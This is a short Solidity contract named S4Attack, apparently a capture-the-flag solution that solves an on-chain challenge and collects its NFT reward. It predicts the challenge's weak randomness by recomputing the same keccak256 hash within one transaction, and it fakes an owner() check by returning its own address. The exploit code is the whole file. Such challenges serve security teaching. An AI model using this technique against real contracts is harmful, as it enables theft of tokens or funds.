// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.4;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IChallengeContract {
    function solveChallenge(uint256, string memory) external;
}

contract S4Attack is IERC721Receiver {
    error NotTheOwner();

    address theOwner;
    IChallengeContract challengeContract = IChallengeContract(0xeF72bA6575b86BeaA9B9e4A78BCa4A58F3cCE276);
    IERC721 nftContract = IERC721(0xDe0e797bfAd78F0615d75430C53F8fe3C9e49883);

    constructor() {
        theOwner = msg.sender;
    }
    
    function owner() external view returns (address) {
        return address(this);
    }

    function go() external {
        string memory handle = "";
        uint256 rng = uint256(keccak256(abi.encodePacked(address(this), block.prevrandao, block.timestamp))) % 1_000_000;
        challengeContract.solveChallenge(rng, handle);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function transferMyNFT(uint256 tokenId) external {
        if (msg.sender != theOwner) {
            revert NotTheOwner();
        }
        nftContract.safeTransferFrom(address(this), msg.sender, tokenId);
    }
}